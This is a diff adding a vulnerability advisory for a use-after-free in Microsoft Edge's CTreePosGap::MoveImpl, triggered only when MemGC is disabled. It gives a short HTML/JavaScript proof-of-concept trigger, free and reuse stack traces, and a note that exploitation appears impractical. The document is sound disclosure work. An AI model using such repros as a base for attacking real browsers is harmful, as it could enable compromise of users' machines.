@@ -1,0 +1,70 @@
+1295v Microsoft Edge CTreePosGap::MoveImpl use-after-free
+=====================================
+
+Synopsis
+--------
+Specially crafted HTML can trigger a use-after-free in Microsoft Edge if MemGC
+is disabled.
+
+Known affected software and attack vectors
+------------------------------------------
++ Microsoft Edge 20.10240.16384.0
+  An attacker would need to get a target user to open a specially crafted
+  webpage. JavaScript appears to be required to trigger the issue.
+
+Repro
+-----
+    <script>
+      setTimeout(function() {
+        var o1 = document.getElementById("x"),
+            o2 = document.createElement("select");
+        o1.insertBefore(o2, o1.firstChild);
+        setTimeout(function () {
+          o1.appendChild(o2);
+        },100);
+      },100);
+    </script>
+    <select id=x>#
+
+Description
+-----------
+Free stack:
+EDGEHTML!MemoryProtection::HeapFree+0x2a65e8
+EDGEHTML!CTreeNode::NodeRelease+0x57
+EDGEHTML!Tree::TreeWriter::UnwrapInternal+0x2e
+EDGEHTML!Tree::TreeWriter::Unwrap+0x133
+EDGEHTML!CTreePosGap::PartitionPointers+0x40a
+EDGEHTML!CSpliceTreeEngine::Init+0x17a
+EDGEHTML!Tree::TreeWriter::SpliceTreeInternal+0xcf
+EDGEHTML!Tree::TreeWriter::CutCopyMoveLegacy+0x4e0
+EDGEHTML!Tree::TreeWriter::MoveNodeLegacy+0x193
+EDGEHTML!Tree::TreeWriter::AppendChild+0x7a
+EDGEHTML!Tree::TreeWriter::InsertNodeAtReferencePosition+0x33
+EDGEHTML!CElement::InsertBeforeHelper+0x129
+EDGEHTML!CElement::InsertBeforeHelper+0x10d
+EDGEHTML!CElement::InsertBefore+0x46
+EDGEHTML!CElement::Var_appendChild+0xe7
+EDGEHTML!CFastDOM::CNode::Trampoline_appendChild+0x90
+
+Reuse stack:
+EDGEHTML!CTreePosGap::MoveImpl+0x53
+EDGEHTML!CSpliceTreeEngine::Init+0x27f
+EDGEHTML!Tree::TreeWriter::SpliceTreeInternal+0xcf
+EDGEHTML!Tree::TreeWriter::CutCopyMoveLegacy+0x4e0
+EDGEHTML!Tree::TreeWriter::MoveNodeLegacy+0x193
+EDGEHTML!Tree::TreeWriter::AppendChild+0x7a
+EDGEHTML!Tree::TreeWriter::InsertNodeAtReferencePosition+0x33
+EDGEHTML!CElement::InsertBeforeHelper+0x129
+EDGEHTML!CElement::InsertBeforeHelper+0x10d
+EDGEHTML!CElement::InsertBefore+0x46
+EDGEHTML!CElement::Var_appendChild+0xe7
+EDGEHTML!CFastDOM::CNode::Trampoline_appendChild+0x90
+
+Exploit
+-------
+From the free & reuse stack, it appears that CSpliceTreeEngine::Init calls
+CTreePosGap::PartitionPointers, which frees the memory and returns. Then
+CSpliceTreeEngine::Init calls CTreePosGap::MoveImpl, which reuses the memory.
+This may indicate that there is not enough time between the free and reuse to
+modify the contents of the memory. Either way, no one runs Edge with MemGC
+disabled.
